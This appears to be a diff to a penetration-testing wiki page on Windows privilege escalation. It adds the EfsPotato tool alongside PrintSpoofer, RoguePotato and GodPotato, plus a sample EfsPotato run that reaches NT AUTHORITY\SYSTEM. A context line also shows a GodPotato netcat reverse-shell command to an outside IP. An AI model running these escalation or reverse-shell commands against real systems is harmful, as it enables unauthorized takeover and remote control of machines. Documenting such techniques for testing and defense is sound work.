@@ -29,7 +29,7 @@ You can check their website and try their engine for **free** at:
 ***
 
 {% hint style="warning" %}
-**JuicyPotato doesn't work** on Windows Server 2019 and Windows 10 build 1809 onwards. However, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato) can be used to **leverage the same privileges and gain `NT AUTHORITY\SYSTEM`** level access. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.
+**JuicyPotato doesn't work** on Windows Server 2019 and Windows 10 build 1809 onwards. However, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,**[**EfsPotato**](https://github.com/zcgonvh/EfsPotato) can be used to **leverage the same privileges and gain `NT AUTHORITY\SYSTEM`** level access. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.
 {% endhint %}
 
 ## Quick Demo
@@ -82,6 +82,25 @@ C:\temp>type C:\temp\w.log
 nt authority\system
 ```
 
+### EfsPotato
+
+```
+EfsPotato.exe "whoami"
+Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
+Part of GMH's fuck Tools, Code By zcgonvh.
+CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]
+
+[+] Current user: NT Service\MSSQLSERVER
+[+] Pipe: \pipe\lsarpc
+[!] binding ok (handle=aeee30)
+[+] Get Token: 888
+[!] process with pid: 3696 created.
+==============================
+[x] EfsRpcEncryptFileSrv failed: 1818
+
+nt authority\system
+```
+
 ### GodPotato
 
 ```
@@ -96,6 +115,7 @@ GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
 * [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
 * [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
 * [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
+* [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
 
 ### [WhiteIntel](https://whiteintel.io)
 
